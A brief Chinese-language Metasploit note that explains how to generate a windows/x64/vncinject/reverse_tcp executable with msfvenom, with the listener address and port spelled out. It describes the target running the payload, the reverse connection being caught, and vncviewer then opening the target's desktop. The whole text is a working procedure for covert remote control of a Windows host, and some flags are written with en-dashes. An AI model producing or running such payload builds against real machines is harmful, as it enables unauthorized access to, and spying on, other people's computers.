选择windows/x64/vncinject/reverse_tcp
设置AUTOVNC为false，run之后，再开启vncviewer

当目标主机能通外网时  
msfvenom –p windows/x64/vncinject/reverse_tcp  
AUTOVNC=false  
LHOST=192.168.1.4  
LPORT=8080  
–f exe  
–o 192.168.1.4-8080.exe  
run  
目标主机执行payload后，监听器需成功接收反连，然后打开vncviewer，访问127.0.0.1:5900
